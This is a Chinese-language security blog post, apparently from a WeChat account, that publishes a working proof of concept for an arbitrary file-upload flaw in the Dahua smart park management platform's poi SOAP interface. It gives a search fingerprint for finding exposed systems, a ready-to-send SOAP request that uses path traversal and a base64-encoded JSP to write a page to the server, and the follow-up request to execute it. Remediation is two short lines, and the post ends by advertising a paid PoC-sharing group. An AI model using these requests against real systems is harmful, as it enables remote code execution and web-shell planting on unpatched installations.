#  大华智慧园区综合管理平台poi接口存在文件上传漏洞  
原创 北雪网络安全
                    北雪网络安全  北雪网络安全   2026-10-14 01:08  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgTNZdZkFiadXxhKwP6xLhlrEkJDj7l1ehUQOSUebaicPMzVy1GSiaAfC2ggLuiagNJHGGfmOMs08ZFyxraTyBVBh4selrdQYJybIg/640?wx_fmt=png&from=appmsg "")  
  
网络安全为人民，网络安全靠人民  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzg4NwQOvxMQwmCWxOoW62GuPsQ1vbc55FqIxHsefOPzfryMrWG4lrIWyRTOdVNCkRvS5I71zLCjAUZKz9ZGbGfok2PqLpekgxU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgJoRFFGgxlp9Ot7eDknK35iaAWR0s0Sp5hO6C3Eytz68icd7x5lE1kpn9ib3CVMaLLSB0hJU0Klg5u4P80Shact21icpFLyb21Vnc/640?wx_fmt=png&from=appmsg "")  
  
**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaLELPMjsuIiboHBw66QjT0qkkxsrWcXLKkMjaibuvNicLQL4zP4BTyXbiaR7CMy6SGqHogoeaaoelBw5eNVRQhl5Ericia75F6yGKm8/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
01  
  
更多内容  
  
#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296  
  
  
02  
  
搜索引擎  
  
  
app="dahua-  
智慧园区综合管理平台  
"  
  
  
03  
  
漏洞复现  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhVZ480ziaATcicUVz44vdf3Htu2n3dfiaTUV1QSNgibv0hJJv5chf28ZsfzuAUGx45wfvkgmWXDRG2mq7F5zvrVVSOhGRPQicxpyXk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgianXPeK9tuW1uDp65ooGQGCDmDcp62NQZUloKyquSDs3F3efIKoezdGXibMYsPXgPIXv2cu7b2xRTicHC1oxvMx9SN2zX6BXuHk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziapYZME9Q5AHpgGcNdme6ZxrRAzVPCmf8960jaakLGiaUnTVI5iaZM8pUaunVZO41vocYb1qLSicXwjAgIgibp7gaMRRDZG6sfEXFo/640?wx_fmt=png&from=appmsg "")  
  
```
POST /emap/webservice/gis/soap/poi HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=8B8F8E669AFAD5E459956D02EEF05CD0
Dnt: 1
Upgrade-Insecure-Requests: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 495

<soapenv:Envelope
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">   <soapenv:Header/>   <soapenv:Body>      <res:uploadPicFile>        
<arg0>/../../security.jsp</arg0>   
<arg1>PCVAcGFnZSBpbXBvcnQ9ImphdmEudGV4dC4qLGphdmEudXRpbC4qLGphdmEuaW8uKiIlPgo8JQogICAgICBvdXQucHJpbnRsbigiVGhlcmUgYXJlIHZ1bG5lcmFiaWxpdGllcyBpbiB0aGUgd2Vic2l0ZS4iICk7CiU+</arg1>      </res:uploadPicFile>  
</soapenv:Body></soapenv:Envelope
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjFoGHpibmnfP2wDpuc5q4AQLFejOgUcicJicehaKKURNqNryv7lPQkYCmIYxJTGt4BrxWibYIrd3ETUuJuVSzvYoCzVj4FxAyEgFM/640?wx_fmt=png&from=appmsg "")  
```
GET /upload/security.jsp HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101
Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=8B8F8E669AFAD5E459956D02EEF05CD0
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgpehWicf2oibibf6mBcCFbTyGwnCJ7ezYKxZicv8sflxJ6G5Hib54jhwVq1Bkl1JJOyqcVMX8aUaccjwqlSI23dg2hfzK9p4C8Jx8Q/640?wx_fmt=png&from=appmsg "")  
  
  
      
  
04  
  
修复建议  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
05  
  
内部圈子  
  
🛠️   
【知名漏洞实战圈，纯干货】  
🛠️  
  
还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！  
目前已更新poc数量2500+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhlic1FqU9R3kY7CrLZUuaYgjiaTtiaNqMp2qgS2DQ5xmWAy1zd4QMqagKASeRVib3ohVrqNU8mht0TubHtSxn4GwOnGoK8Q6dVXFE/640?wx_fmt=png&from=appmsg "")  
  
  
🎯 适用场景  
  
**▫️渗透测试▫️企业漏洞自查▫️攻防演练▫️安全服务▫️合规运营**  
  
****  
  
**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**  
  
**▫️全民掌握网安技能，共守智能时代晴空。**  
  
  
  
  
  
  
